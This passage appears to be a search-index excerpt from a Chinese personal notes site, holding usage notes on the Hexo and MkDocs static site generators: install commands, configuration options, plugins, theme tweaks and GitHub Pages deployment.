\uff1a\u64a4\u9500\u7b2c\u4e00\u6761 commit\uff08\u4e0d\u66f4\u6539\u6587\u4ef6\uff09 git push -f \uff1a\u5f3a\u5236\u63a8\u9001\uff0c\u8986\u76d6 commit","title":"\u6e05\u9664\u547d\u4ee4"},{"location":"cs/tools/hexo/","text":"hexo \u4f7f\u7528\u8bb0\u5f55 \u00b6 Abstract \u5f53\u65f6\u5728\u7528 mkdocs \u642d\u5efa\u4e86\u535a\u5ba2\u4e4b\u540e\u611f\u89c9\u4e0d\u50cf\u4e2a\u535a\u5ba2\u7684\u6837\u5b50\uff0c\u6240\u4ee5\u6362\u4e86 hexo\uff0c\u7528\u6765\u751f\u6210\u535a\u5ba2\u7f51\u7ad9\u8fd8\u662f\u5f88\u65b9\u4fbf\u7684\u3002 \u5b89\u88c5 \u00b6 hexo \u57fa\u4e8e node.js\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 npm install -g hexo-cli \u6765\u5b89\u88c5 \u4f7f\u7528 \u00b6 \u521b\u5efa blog \u76ee\u5f55\u653e\u7f6e\u535a\u5ba2\uff1a $ hexo init blog # \u4e5f\u53ef\u4ee5\u624b\u52a8\u521b\u5efa\u76ee\u5f55\u540e\u8fdb\u5165 $ mkdir blog & cd blog & hexo init \u5b89\u88c5\u9700\u8981\u7684\u5305\uff1a $ npm install \u542f\u52a8\u5185\u7f6e\u9884\u89c8\u670d\u52a1\uff08\u9ed8\u8ba4\u7aef\u53e3 4000\uff09\uff1a $ hexo s # hexo serve \u751f\u6210\u7f51\u7ad9\uff1a $ hexo g # hexo generate \u4e4b\u540e\u4f1a\u751f\u6210\u4e00\u4e2a public/ \u6587\u4ef6\u5939\uff0c\u4e3a\u7f51\u7ad9\u6e90\u7801 hexo init \u751f\u6210\u7684\u76ee\u5f55\u7ed3\u6784\u4e3a\uff1a \u251c\u2500\u2500 _config.yml # \u914d\u7f6e\u6587\u4ef6 \u251c\u2500\u2500 package.json # \u5e94\u7528\u4fe1\u606f \u251c\u2500\u2500 scaffolds/ # \u6a21\u677f\u6587\u4ef6\u5939 \u251c\u2500\u2500 source/ # \u6e90\u6587\u4ef6\u5939 | \u2514\u2500\u2500 _posts/ # \u7a3f\u4ef6\u6587\u4ef6\u5939 \u2514\u2500\u2500 themes/ # \u4e3b\u9898\u6587\u4ef6\u5939 \u521b\u5efa\u4e00\u7bc7\u65b0\u7684\u6587\u7ae0\u4f7f\u7528 hexo new \u547d\u4ee4\uff0c\u9ed8\u8ba4\u4f1a\u521b\u5efa\u4e00\u7bc7 post\uff0c\u6bd4\u5982 hexo new \"test\" \u4f1a\u5728 source/_post/ \u91cc\u4f7f\u7528 scaffolds/post.md \u4e3a\u6a21\u677f\u521b\u5efa\u4e00\u4e2a test.md \u914d\u7f6e \u00b6 _config.yml \u8fd9\u4e2a\u6587\u4ef6\u662f hexo \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u91cc\u9762\u7684\u5185\u5bb9\uff1a title \uff1a\u7f51\u7ad9\u6807\u9898 subtitle \uff1a\u526f\u6807\u9898 description \uff1a\u7f51\u7ad9\u63cf\u8ff0 keywords \uff1a\u7f51\u7ad9\u5173\u952e\u8bcd author \uff1a\u4f5c\u8005 language \uff1a\u8bed\u8a00 timezone \uff1a\u65f6\u533a \u4ee5\u4e0a\u8bbe\u7f6e\u4f1a\u51fa\u73b0\u5728 meta \u91cc url \uff1a\u7f51\u5740 root \uff1a\u7f51\u7ad9\u6839\u76ee\u5f55 permalink \uff1a\u6c38\u4e45\u94fe\u63a5\u683c\u5f0f\uff0c\u6bd4\u5982 :year/:month/:day/:title/ source_dir \uff1a\u6e90\u6587\u4ef6\u5939\uff0c\u9ed8\u8ba4 source public_dir \uff1a\u751f\u6210\u7684\u7f51\u7ad9\u6587\u4ef6\u5939 theme \uff1a\u4e3b\u9898 \u2026\u2026 \u6240\u6709\u914d\u7f6e\u8fd8\u662f\u770b\u5b98\u7f51\uff1a https://hexo.io/zh-cn/docs/configuration \u90e8\u7f72\u5230 GitHub pages \u00b6 \u914d\u7f6e\u6587\u4ef6\u4e2d\uff1a deploy : - type : git repo : https://github.com/.../... branch : master \u7136\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 hexo d \uff08 hexo deploy \uff09\u6765\u90e8\u7f72\u5230 GitHub pages \u4e0a\uff08\u6216\u8005 hexo d -g \u751f\u6210\u5e76\u90e8\u7f72\uff09 \u4e00\u4e9b\u63d2\u4ef6 \u00b6 \u5b89\u88c5\u63d2\u4ef6\u90fd\u53ef\u4ee5\u901a\u8fc7 npm install ... --save \u6765\u5b89\u88c5 hexo-abbrlink \u00b6 \u751f\u6210\u4e00\u4e2a\u77ed\u7684\u6c38\u4e45\u94fe\u63a5\uff0c\u5b89\u88c5\u540e\u53ea\u9700\u8981\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u6539\uff1a permalink : p/:abbrlink.html abbrlink : alg : crc32 rep : hex \u5c31\u4f1a\u4e3a\u5229\u7528 crc32 \u4e3a\u6bcf\u7bc7\u6587\u7ae0\u8bbe\u7f6e\u4e00\u4e2a hex \u503c\u7684\u6c38\u4e45\u94fe\u63a5 hexo-blog-encrypt \u00b6 \u53ef\u4ee5\u4e3a\u6587\u7ae0\u52a0\u5bc6\uff0c\u53ea\u9700\u8981\u5728 md \u7684\u6587\u4ef6\u5934\u52a0\u4e0a\uff1a password : ... \u5c31\u53ef\u4ee5\u52a0\u5bc6\u8fd9\u7bc7\u6587\u7ae0\u3002\u66f4\u591a\u7528\u6cd5\u548c\u8bbe\u7f6e\u5728 GitHub \u4e0a\uff1a D0n9X1n/hexo-blog-encrypt hexo-generator-index/archive/category/tag \u00b6 \u57fa\u672c\u662f\u5fc5\u987b\u8981\u88c5\u7684\u4e86\uff0c\u7528\u6765\u751f\u6210\u4e3b\u9875/\u5f52\u6863/\u5206\u7c7b/\u6807\u7b7e\u6587\u4ef6\u5939 index_generator : path : '' per_page : 10 order_by : '-date' archive_generator : per_page : 30 tag_generator : per_page : 30 category_generator : per_page : 30 \u5206\u522b\u7528\u6765\u6307\u5b9a\u5404\u4e2a\u9875\u9762\u6bcf\u4e2a\u9875\u9762\u7684\u6587\u7ae0\u4e2a\u6570 hexo-generator-feed \u00b6 \u7528\u6765\u751f\u6210 RSS \u8ba2\u9605 xml \u6587\u4ef6 feed : enable : true type : atom path : atom.xml limit : 20 hexo-generator-index-pin-top \u00b6 \u7f6e\u9876\u67d0\u7bc7\u6587\u7ae0\uff0c\u53ea\u9700\u8981\u5728\u6587\u4ef6\u5934\u52a0\u4e0a top: true \u5373\u53ef \u4f46\u662f icarus \u4e3b\u9898\u597d\u50cf\u4e0d\u652f\u6301\u2026\u2026 hexo-generator-search/searchdb \u00b6 \u7528\u6765\u751f\u6210\u641c\u7d22\u76f8\u5173 search : path : search.xml field : all content : true limit : 9999 hexo-wordcount \u00b6 \u7528\u6765\u751f\u6210\u5b57\u6570\u7edf\u8ba1\u3002\u597d\u50cf\u4e0d\u9700\u8981\u914d\u7f6e\u4ec0\u4e48 \u4e3b\u9898 \u00b6 \u73b0\u5728\u7684\u535a\u5ba2\u7528\u4e86\u4e00\u4e2a\u633a\u7b80\u6d01\u7684\u4e3b\u9898\uff0c ppoffice/hexo-theme-icarus \u4f46\u662f\u8fd9\u4e2a\u4e3b\u9898\u7684\u5f0a\u7aef\u4e5f\u633a\u591a\uff0c\u6bd4\u5982\u6240\u6709\u9875\u9762\u90fd\u4f1a\u52a0\u8f7d\u4e00\u4e2a content.json\uff0c\u91cc\u9762\u5b58\u653e\u4e86\u6574\u4e2a\u7f51\u7ad9\u7684\u6240\u6709\u6587\u7ae0\u5305\u62ec\u5185\u5bb9\uff0c\u5bfc\u81f4\u52a0\u8f7d\u5f88\u6162\uff08\u8822\u7684\u5f88\uff09 \u6574\u4e2a\u4e3b\u9898\u57fa\u672c\u4e0a\u662f\u7528 jsx \u6765\u5199\u7684\uff0c\u6837\u5f0f\u662f\u7528 styl \u5199\u7684\uff0c\u6539\u7684\u8bdd\u8fd8\u6bd4\u8f83\u65b9\u4fbf \u6bd4\u5982\u589e\u52a0\u7f6e\u9876\u7684\u529f\u80fd\uff1a \u7f6e\u9876 \u6bcf\u7bc7\u6587\u7ae0\u7684 card \u548c\u5185\u5bb9\u9875\u9762\u90fd\u662f\u7531 layout/common/article.jsx \u6765\u751f\u6210 \u6240\u4ee5\u76f4\u63a5\u5728 .card.level-left \u91cc\u9762\u52a0\uff1a {page.top && < span class = \"level-item\" style = \"color: #ff7242;\" > < i class = \"fas fa-thumbtack\" style = \"margin-right: 0.3em;\" ></ i > \u7f6e\u9876 </ span > } \u5c31\u53ef\u4ee5\u4e3a\u6587\u4ef6\u5934\u6709 top: true \u7684\u6587\u7ae0\u5728\u6700\u9876\u90e8\u6700\u5de6\u4fa7\u52a0\u4e0a\u7f6e\u9876\u6807\u5fd7 \u800c\u4e14\u8fd9\u4e2a\u4e3b\u9898\u4e0d\u652f\u6301\u4ece\u914d\u7f6e\u6587\u4ef6\u548c\u5f53\u524d\u76ee\u5f55\u5d4c\u5165 js \u548c css\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u53bb\u8fd9\u4e2a\u4e3b\u9898\u7684 source \u6587\u4ef6\u5939\u6539\u5c31\u597d\u4e86 Reference \u00b6 Hexo \u5b98\u7f51 zzq \u6d45\u8c08\u7528 Hexo+GitHub \u642d\u5efa\u81ea\u5df1\u7684 blog Hexo \u535a\u5ba2\u642d\u5efa\u8bf4\u660e\u4e66\uff08\u6307\u5317\u4e66\uff09 \u4ece\u96f6\u642d\u5efa Hexo + Github \u535a\u5ba2","title":"hexo \u4f7f\u7528\u8bb0\u5f55"},{"location":"cs/tools/hexo/#hexo","text":"Abstract \u5f53\u65f6\u5728\u7528 mkdocs \u642d\u5efa\u4e86\u535a\u5ba2\u4e4b\u540e\u611f\u89c9\u4e0d\u50cf\u4e2a\u535a\u5ba2\u7684\u6837\u5b50\uff0c\u6240\u4ee5\u6362\u4e86 hexo\uff0c\u7528\u6765\u751f\u6210\u535a\u5ba2\u7f51\u7ad9\u8fd8\u662f\u5f88\u65b9\u4fbf\u7684\u3002","title":"hexo \u4f7f\u7528\u8bb0\u5f55"},{"location":"cs/tools/hexo/#_1","text":"hexo \u57fa\u4e8e node.js\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 npm install -g hexo-cli \u6765\u5b89\u88c5","title":"\u5b89\u88c5"},{"location":"cs/tools/hexo/#_2","text":"\u521b\u5efa blog \u76ee\u5f55\u653e\u7f6e\u535a\u5ba2\uff1a $ hexo init blog # \u4e5f\u53ef\u4ee5\u624b\u52a8\u521b\u5efa\u76ee\u5f55\u540e\u8fdb\u5165 $ mkdir blog & cd blog & hexo init \u5b89\u88c5\u9700\u8981\u7684\u5305\uff1a $ npm install \u542f\u52a8\u5185\u7f6e\u9884\u89c8\u670d\u52a1\uff08\u9ed8\u8ba4\u7aef\u53e3 4000\uff09\uff1a $ hexo s # hexo serve \u751f\u6210\u7f51\u7ad9\uff1a $ hexo g # hexo generate \u4e4b\u540e\u4f1a\u751f\u6210\u4e00\u4e2a public/ \u6587\u4ef6\u5939\uff0c\u4e3a\u7f51\u7ad9\u6e90\u7801 hexo init \u751f\u6210\u7684\u76ee\u5f55\u7ed3\u6784\u4e3a\uff1a \u251c\u2500\u2500 _config.yml # \u914d\u7f6e\u6587\u4ef6 \u251c\u2500\u2500 package.json # \u5e94\u7528\u4fe1\u606f \u251c\u2500\u2500 scaffolds/ # \u6a21\u677f\u6587\u4ef6\u5939 \u251c\u2500\u2500 source/ # \u6e90\u6587\u4ef6\u5939 | \u2514\u2500\u2500 _posts/ # \u7a3f\u4ef6\u6587\u4ef6\u5939 \u2514\u2500\u2500 themes/ # \u4e3b\u9898\u6587\u4ef6\u5939 \u521b\u5efa\u4e00\u7bc7\u65b0\u7684\u6587\u7ae0\u4f7f\u7528 hexo new \u547d\u4ee4\uff0c\u9ed8\u8ba4\u4f1a\u521b\u5efa\u4e00\u7bc7 post\uff0c\u6bd4\u5982 hexo new \"test\" \u4f1a\u5728 source/_post/ \u91cc\u4f7f\u7528 scaffolds/post.md \u4e3a\u6a21\u677f\u521b\u5efa\u4e00\u4e2a test.md","title":"\u4f7f\u7528"},{"location":"cs/tools/hexo/#_3","text":"_config.yml \u8fd9\u4e2a\u6587\u4ef6\u662f hexo \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u91cc\u9762\u7684\u5185\u5bb9\uff1a title \uff1a\u7f51\u7ad9\u6807\u9898 subtitle \uff1a\u526f\u6807\u9898 description \uff1a\u7f51\u7ad9\u63cf\u8ff0 keywords \uff1a\u7f51\u7ad9\u5173\u952e\u8bcd author \uff1a\u4f5c\u8005 language \uff1a\u8bed\u8a00 timezone \uff1a\u65f6\u533a \u4ee5\u4e0a\u8bbe\u7f6e\u4f1a\u51fa\u73b0\u5728 meta \u91cc url \uff1a\u7f51\u5740 root \uff1a\u7f51\u7ad9\u6839\u76ee\u5f55 permalink \uff1a\u6c38\u4e45\u94fe\u63a5\u683c\u5f0f\uff0c\u6bd4\u5982 :year/:month/:day/:title/ source_dir \uff1a\u6e90\u6587\u4ef6\u5939\uff0c\u9ed8\u8ba4 source public_dir \uff1a\u751f\u6210\u7684\u7f51\u7ad9\u6587\u4ef6\u5939 theme \uff1a\u4e3b\u9898 \u2026\u2026 \u6240\u6709\u914d\u7f6e\u8fd8\u662f\u770b\u5b98\u7f51\uff1a https://hexo.io/zh-cn/docs/configuration","title":"\u914d\u7f6e"},{"location":"cs/tools/hexo/#github-pages","text":"\u914d\u7f6e\u6587\u4ef6\u4e2d\uff1a deploy : - type : git repo : https://github.com/.../... branch : master \u7136\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 hexo d \uff08 hexo deploy \uff09\u6765\u90e8\u7f72\u5230 GitHub pages \u4e0a\uff08\u6216\u8005 hexo d -g \u751f\u6210\u5e76\u90e8\u7f72\uff09","title":"\u90e8\u7f72\u5230 GitHub pages"},{"location":"cs/tools/hexo/#_4","text":"\u5b89\u88c5\u63d2\u4ef6\u90fd\u53ef\u4ee5\u901a\u8fc7 npm install ... --save \u6765\u5b89\u88c5","title":"\u4e00\u4e9b\u63d2\u4ef6"},{"location":"cs/tools/hexo/#hexo-abbrlink","text":"\u751f\u6210\u4e00\u4e2a\u77ed\u7684\u6c38\u4e45\u94fe\u63a5\uff0c\u5b89\u88c5\u540e\u53ea\u9700\u8981\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u6539\uff1a permalink : p/:abbrlink.html abbrlink : alg : crc32 rep : hex \u5c31\u4f1a\u4e3a\u5229\u7528 crc32 \u4e3a\u6bcf\u7bc7\u6587\u7ae0\u8bbe\u7f6e\u4e00\u4e2a hex \u503c\u7684\u6c38\u4e45\u94fe\u63a5","title":"hexo-abbrlink"},{"location":"cs/tools/hexo/#hexo-blog-encrypt","text":"\u53ef\u4ee5\u4e3a\u6587\u7ae0\u52a0\u5bc6\uff0c\u53ea\u9700\u8981\u5728 md \u7684\u6587\u4ef6\u5934\u52a0\u4e0a\uff1a password : ... \u5c31\u53ef\u4ee5\u52a0\u5bc6\u8fd9\u7bc7\u6587\u7ae0\u3002\u66f4\u591a\u7528\u6cd5\u548c\u8bbe\u7f6e\u5728 GitHub \u4e0a\uff1a D0n9X1n/hexo-blog-encrypt","title":"hexo-blog-encrypt"},{"location":"cs/tools/hexo/#hexo-generator-indexarchivecategorytag","text":"\u57fa\u672c\u662f\u5fc5\u987b\u8981\u88c5\u7684\u4e86\uff0c\u7528\u6765\u751f\u6210\u4e3b\u9875/\u5f52\u6863/\u5206\u7c7b/\u6807\u7b7e\u6587\u4ef6\u5939 index_generator : path : '' per_page : 10 order_by : '-date' archive_generator : per_page : 30 tag_generator : per_page : 30 category_generator : per_page : 30 \u5206\u522b\u7528\u6765\u6307\u5b9a\u5404\u4e2a\u9875\u9762\u6bcf\u4e2a\u9875\u9762\u7684\u6587\u7ae0\u4e2a\u6570","title":"hexo-generator-index/archive/category/tag"},{"location":"cs/tools/hexo/#hexo-generator-feed","text":"\u7528\u6765\u751f\u6210 RSS \u8ba2\u9605 xml \u6587\u4ef6 feed : enable : true type : atom path : atom.xml limit : 20","title":"hexo-generator-feed"},{"location":"cs/tools/hexo/#hexo-generator-index-pin-top","text":"\u7f6e\u9876\u67d0\u7bc7\u6587\u7ae0\uff0c\u53ea\u9700\u8981\u5728\u6587\u4ef6\u5934\u52a0\u4e0a top: true \u5373\u53ef \u4f46\u662f icarus \u4e3b\u9898\u597d\u50cf\u4e0d\u652f\u6301\u2026\u2026","title":"hexo-generator-index-pin-top"},{"location":"cs/tools/hexo/#hexo-generator-searchsearchdb","text":"\u7528\u6765\u751f\u6210\u641c\u7d22\u76f8\u5173 search : path : search.xml field : all content : true limit : 9999","title":"hexo-generator-search/searchdb"},{"location":"cs/tools/hexo/#hexo-wordcount","text":"\u7528\u6765\u751f\u6210\u5b57\u6570\u7edf\u8ba1\u3002\u597d\u50cf\u4e0d\u9700\u8981\u914d\u7f6e\u4ec0\u4e48","title":"hexo-wordcount"},{"location":"cs/tools/hexo/#_5","text":"\u73b0\u5728\u7684\u535a\u5ba2\u7528\u4e86\u4e00\u4e2a\u633a\u7b80\u6d01\u7684\u4e3b\u9898\uff0c ppoffice/hexo-theme-icarus \u4f46\u662f\u8fd9\u4e2a\u4e3b\u9898\u7684\u5f0a\u7aef\u4e5f\u633a\u591a\uff0c\u6bd4\u5982\u6240\u6709\u9875\u9762\u90fd\u4f1a\u52a0\u8f7d\u4e00\u4e2a content.json\uff0c\u91cc\u9762\u5b58\u653e\u4e86\u6574\u4e2a\u7f51\u7ad9\u7684\u6240\u6709\u6587\u7ae0\u5305\u62ec\u5185\u5bb9\uff0c\u5bfc\u81f4\u52a0\u8f7d\u5f88\u6162\uff08\u8822\u7684\u5f88\uff09 \u6574\u4e2a\u4e3b\u9898\u57fa\u672c\u4e0a\u662f\u7528 jsx \u6765\u5199\u7684\uff0c\u6837\u5f0f\u662f\u7528 styl \u5199\u7684\uff0c\u6539\u7684\u8bdd\u8fd8\u6bd4\u8f83\u65b9\u4fbf \u6bd4\u5982\u589e\u52a0\u7f6e\u9876\u7684\u529f\u80fd\uff1a \u7f6e\u9876 \u6bcf\u7bc7\u6587\u7ae0\u7684 card \u548c\u5185\u5bb9\u9875\u9762\u90fd\u662f\u7531 layout/common/article.jsx \u6765\u751f\u6210 \u6240\u4ee5\u76f4\u63a5\u5728 .card.level-left \u91cc\u9762\u52a0\uff1a {page.top && < span class = \"level-item\" style = \"color: #ff7242;\" > < i class = \"fas fa-thumbtack\" style = \"margin-right: 0.3em;\" ></ i > \u7f6e\u9876 </ span > } \u5c31\u53ef\u4ee5\u4e3a\u6587\u4ef6\u5934\u6709 top: true \u7684\u6587\u7ae0\u5728\u6700\u9876\u90e8\u6700\u5de6\u4fa7\u52a0\u4e0a\u7f6e\u9876\u6807\u5fd7 \u800c\u4e14\u8fd9\u4e2a\u4e3b\u9898\u4e0d\u652f\u6301\u4ece\u914d\u7f6e\u6587\u4ef6\u548c\u5f53\u524d\u76ee\u5f55\u5d4c\u5165 js \u548c css\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u53bb\u8fd9\u4e2a\u4e3b\u9898\u7684 source \u6587\u4ef6\u5939\u6539\u5c31\u597d\u4e86","title":"\u4e3b\u9898"},{"location":"cs/tools/hexo/#reference","text":"Hexo \u5b98\u7f51 zzq \u6d45\u8c08\u7528 Hexo+GitHub \u642d\u5efa\u81ea\u5df1\u7684 blog Hexo \u535a\u5ba2\u642d\u5efa\u8bf4\u660e\u4e66\uff08\u6307\u5317\u4e66\uff09 \u4ece\u96f6\u642d\u5efa Hexo + Github \u535a\u5ba2","title":"Reference"},{"location":"cs/tools/mkdocs/","text":"mkdocs \u4f7f\u7528\u8bb0\u5f55 \u00b6 Abstract \u6211\u6700\u65e9\u63a5\u89e6\u7684\u7f51\u7ad9\u751f\u6210\u5668\u5c31\u662f mkdocs\uff0c\u7136\u540e\u7528\u5b83\u642d\u4e86\u535a\u5ba2\u3002\u4f46\u7531\u4e8e\u5f53\u65f6\u89c9\u5f97\u770b\u8d77\u6765\u592a\u5e73\u6de1\u3001\u529f\u80fd\u5c11\u7b49\u539f\u56e0\u629b\u5f03\u4e86\u5b83\u6362\u6210\u4e86 hexo \u540e\u6765\u6253\u7b97\u641e\u4e00\u4e2a\u7b14\u8bb0\u672c\u6574\u7406\u4e00\u4e9b\u6709\u4ef7\u503c\u7684\u5185\u5bb9\uff0c\u6240\u4ee5\u642d\u4e86\u8fd9\u4e2a\u7f51\u7ad9\uff0c\u7528\u56de\u4e86 mkdocs mkdocs \u5c31\u5f88\u9002\u5408\u7528\u6765\u505a\u8fd9\u79cd\u7ad9\u70b9\uff0c\u800c\u4e14\u5b83\u57fa\u4e8e python\uff0c\u4f7f\u7528 pymarkdown \u6e32\u67d3 markdown \u6587\u6863\uff0c\u6700\u540e\u4f7f\u7528 html \u6a21\u677f\u6e32\u67d3\uff0c\u4e5f\u5f88\u65b9\u4fbf\u4fee\u6539\u3002\u6240\u4ee5 mkdocs \u8fd8\u662f\u5f88\u9999\u7684 \u5b89\u88c5 \u00b6 mkdocs \u662f python \u7684\u4e00\u4e2a\u5305\uff0c\u76f4\u63a5 pip install mkdocs \u5c31\u53ef\u4ee5\u4e86 \u4f7f\u7528 \u00b6 $ mkdocs new test # \u521b\u5efa\u4e00\u4e2a\u540d\u4e3a test \u7684\u6587\u4ef6\u5939,\u5b58\u50a8\u4ee3\u7801 $ cd test \u6b64\u65f6\u7684\u76ee\u5f55\u7ed3\u6784 test/ \u251c\u2500\u2500 docs/ # \u5b58\u653emarkdown\u6587\u6863 \u2502 \u2514\u2500\u2500 index.md # \u4e3b\u9875 \u2514\u2500\u2500 mkdocs.yml # \u914d\u7f6e\u6587\u4ef6 \u6253\u5f00\u5b9e\u65f6\u6e32\u67d3\u670d\u52a1\uff08\u9ed8\u8ba4\u7aef\u53e3 8000\uff09\uff0c\u5e76\u4e14\u4f7f\u7528 watchdog \u76d1\u63a7\u6587\u4ef6\u5939\u5185\u7684\u66f4\u6539 $ mkdocs serve \u5728\u6d4f\u89c8\u5668\u4e2d\u8f93\u5165 127.0.0.1:8000 \u9884\u89c8\uff0c\u7ec8\u7aef\u952e\u5165 Ctrl + C \u5173\u95ed\u670d\u52a1\u5668 $ mkdocs build # \u751f\u6210\u9759\u6001\u7f51\u9875\u4ee3\u7801 \u8fd9\u65f6\u5df2\u7ecf\u751f\u6210\u4e86 site/ \u6587\u4ef6\u5939\uff0c\u53ef\u4ee5\u5c06\u91cc\u9762\u7684\u5185\u5bb9\u90e8\u7f72\u5230\u7f51\u7ad9\u4e0a\u4e86 $ mkdocs gh-deploy \u81ea\u52a8\u6839\u636e mkdocs.yml \u4e2d\u8bbe\u7f6e\u7684\u9879\u76ee\u5730\u5740\u90e8\u7f72\u5230 GitHub \u7684 gh-pages \u5206\u652f\u4e2d \u914d\u7f6e\u6587\u4ef6 \u00b6 site_name \uff1a \u5fc5\u586b \uff0c\u6587\u6863\u4e3b\u6807\u9898\u540d\u79f0 site_url \uff1a\u6700\u7ec8\u7684\u7f51\u7ad9 url repo_url \uff1a\u5bf9\u5e94\u7684 GitHub repo \u7684\u94fe\u63a5\uff0c\u7528\u4e8e deploy \u548c\u53f3\u4e0a\u89d2\u7684\u94fe\u63a5 edit_url \uff1a\u76f8\u5bf9\u4e8e repo \u94fe\u63a5\u7684 docs \u76ee\u5f55\u5730\u5740 site_description \u7ad9\u70b9\u63cf\u8ff0 copyright \uff1a\u5de6\u4e0b\u89d2\u7248\u6743\u4fe1\u606f theme: \u4e3b\u9898\u6837\u5f0f\u4f8b\u5982: theme : name : 'material' # \u4f7f\u7528material\u4e3b\u9898,\u9700\u8981pip\u5b89 \u88c5mkdocs-material language : 'zh' # \u4f7f\u7528\u4e2d\u6587 icon : logo : ... # \u5de6\u4e0a\u89d2\u7684 logo custom_dir : ... # \u7528\u4e8e\u8986\u76d6\u6a21\u677f feature : ... font : # \u5b57\u4f53 text : ... code : ... palette : ... # \u914d\u8272\u65b9\u6848 markdown_extensions \uff1a\u9700\u8981\u6dfb\u52a0\u7684 pymarkdown \u6269\u5c55\uff08\u5305\u5df2\u7ecf\u968f mkdocs \u9ed8\u8ba4\u5b89\u88c5\uff09\uff0c\u5177\u4f53\u5404\u79cd\u6269\u5c55\u7684\u7528\u6cd5\u770b \u5b98\u65b9\u6587\u6863 extra \uff1a\u4e3b\u9898\u9700\u8981\u7684\u5176\u4ed6\u914d\u7f6e\uff0c\u6bd4\u5982 material \u4e3b\u9898\u7684\u53f3\u4e0b\u89d2\u94fe\u63a5 social \u548c\u6d41\u91cf\u5206\u6790 analytics \u7684\u8bbe\u7f6e extra_css \uff1a\u9644\u52a0\u7684 css \u6587\u4ef6\uff0c\u53ef\u4ee5\u662f url \u4e5f\u53ef\u4ee5\u662f\u76f8\u5bf9\u4e8e docs \u7684\u76f8\u5bf9\u8def\u5f84 extra_javascript \uff1a\u9644\u52a0\u7684 js \u6587\u4ef6\uff0c\u53ef\u4ee5\u662f url \u4e5f\u53ef\u4ee5\u662f\u76f8\u5bf9\u4e8e docs \u7684\u76f8\u5bf9\u8def\u5f84\u3002\u4f1a\u653e\u5230 body \u7684\u6700\u540e\uff0c\u5982\u679c\u9700\u8981\u653e\u5230 head \u91cc\u9700\u8981\u7528\u8986\u76d6\u6a21\u677f\u7684\u65b9\u5f0f plugins \uff1a\u4e00\u4e9b\u63d2\u4ef6\uff0c\u6bd4\u5982\u641c\u7d22 search \uff0c\u663e\u793a\u6700\u8fd1\u4fee\u6539\u65f6\u95f4 git-revision-date-localized nav \uff1a\u76ee\u5f55\u7ed3\u6784 \u672c\u7ad9\u7684\u914d\u7f6e\u6587\u6863\u5728\uff1a https://github.com/TonyCrane/note/blob/master/mkdocs.yml \uff0c\u53ef\u4f9b\u53c2\u8003 \u5177\u4f53\u7684\u5404\u79cd\u7528\u6cd5\u8fd8\u662f\u770b\u5b98\u65b9\u6587\u6863\u6bd4\u8f83\u597d\uff0c\u5f88\u5168\u9762 Reference \u00b6 mkdocs \u5b98\u65b9\u6587\u6863 pymarkdown \u5185\u7f6e extensions pymdown-extensions \u6587\u6863 mateial for mkdocs \u6587\u6863 shafish.cn \u4e0a\u7684\u6559\u7a0b","title":"mkdocs \u4f7f\u7528\u8bb0\u5f55"},{"location":"cs/tools/mkdocs/#mkdocs","text":"Abstract \u6211\u6700\u65e9\u63a5\u89e6\u7684\u7f51\u7ad9\u751f\u6210\u5668\u5c31\u662f mkdocs\uff0c\u7136\u540e\u7528\u5b83\u642d\u4e86\u535a\u5ba2\u3002\u4f46\u7531\u4e8e\u5f53\u65f6\u89c9\u5f97\u770b\u8d77\u6765\u592a\u5e73\u6de1\u3001\u529f\u80fd\u5c11\u7b49\u539f\u56e0\u629b\u5f03\u4e86\u5b83\u6362\u6210\u4e86 hexo \u540e\u6765\u6253\u7b97\u641e\u4e00\u4e2a\u7b14\u8bb0\u672c\u6574\u7406\u4e00\u4e9b\u6709\u4ef7\u503c\u7684\u5185\u5bb9\uff0c\u6240\u4ee5\u642d\u4e86\u8fd9\u4e2a\u7f51\u7ad9\uff0c\u7528\u56de\u4e86 mkdocs mkdocs \u5c31\u5f88\u9002\u5408\u7528\u6765\u505a\u8fd9\u79cd\u7ad9\u70b9\uff0c\u800c\u4e14\u5b83\u57fa\u4e8e python\uff0c\u4f7f\u7528 pymarkdown \u6e32\u67d3 markdown \u6587\u6863\uff0c\u6700\u540e\u4f7f\u7528 html \u6a21\u677f\u6e32\u67d3\uff0c\u4e5f\u5f88\u65b9\u4fbf\u4fee\u6539\u3002\u6240\u4ee5 mkdocs \u8fd8\u662f\u5f88\u9999\u7684","title":"mkdocs \u4f7f\u7528\u8bb0\u5f55"},{"location":"cs/tools/mkdocs/#_1","text":"mkdocs \u662f python \u7684\u4e00\u4e2a\u5305\uff0c\u76f4\u63a5 pip install mkdocs \u5c31\u53ef\u4ee5\u4e86","title":"\u5b89\u88c5"},{"location":"cs/tools/mkdocs/#_2","text":"$ mkdocs new test # \u521b\u5efa\u4e00\u4e2a\u540d\u4e3a test \u7684\u6587\u4ef6\u5939,\u5b58\u50a8\u4ee3\u7801 $ cd test \u6b64\u65f6\u7684\u76ee\u5f55\u7ed3\u6784 test/ \u251c\u2500\u2500 docs/ # \u5b58\u653emarkdown\u6587\u6863 \u2502 \u2514\u2500\u2500 index.md # \u4e3b\u9875 \u2514\u2500\u2500 mkdocs.yml # \u914d\u7f6e\u6587\u4ef6 \u6253\u5f00\u5b9e\u65f6\u6e32\u67d3\u670d\u52a1\uff08\u9ed8\u8ba4\u7aef\u53e3 8000\uff09\uff0c\u5e76\u4e14\u4f7f\u7528 watchdog \u76d1\u63a7\u6587\u4ef6\u5939\u5185\u7684\u66f4\u6539 $ mkdocs serve \u5728\u6d4f\u89c8\u5668\u4e2d\u8f93\u5165 127.0.0.1:8000 \u9884\u89c8\uff0c\u7ec8\u7aef\u952e\u5165 Ctrl + C \u5173\u95ed\u670d\u52a1\u5668 $ mkdocs build # \u751f\u6210\u9759\u6001\u7f51\u9875\u4ee3\u7801 \u8fd9\u65f6\u5df2\u7ecf\u751f\u6210\u4e86 site/ \u6587\u4ef6\u5939\uff0c\u53ef\u4ee5\u5c06\u91cc\u9762\u7684\u5185\u5bb9\u90e8\u7f72\u5230\u7f51\u7ad9\u4e0a\u4e86 $ mkdocs gh-deploy \u81ea\u52a8\u6839\u636e mkdocs.yml 